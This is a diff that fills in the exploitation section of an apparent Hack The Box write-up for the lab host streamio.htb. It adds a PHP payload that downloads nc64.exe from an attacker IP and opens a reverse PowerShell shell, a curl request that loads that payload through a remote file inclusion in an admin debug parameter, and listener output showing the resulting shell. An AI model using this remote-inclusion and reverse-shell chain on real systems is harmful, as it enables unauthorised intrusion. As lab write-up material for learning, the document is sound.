@@ -722,10 +722,32 @@ Description of the vulnerability exploited.
 
 ### Exploitation
 
-Step-by-step exploitation with commands.
+rce.php:
 
-```shell
-# Commands used
+```php
+system("powershell -c wget 10.10.15.80:9002/nc64.exe -outfile \\programdata\\nc64.exe");
+system("\\programdata\\nc64.exe -e powershell 10.10.15.80 4444");
+```
+
+```
+ curl -sk -X POST 'https://streamio.htb/admin/?debug=master.php' \
+  -b 'PHPSESSID=k3fh7aj356m5b9ids63elr0u91' \
+  --data-urlencode 'include=http://10.10.15.80:9002/rce.php'
+
+```
+
+```
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.15.80] from (UNKNOWN) [10.129.154.2] 54821
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\inetpub\streamio.htb\admin> whoami
+whoami
+streamio\yoshihide
+PS C:\inetpub\streamio.htb\admin> 
+
 ```
 
 ---
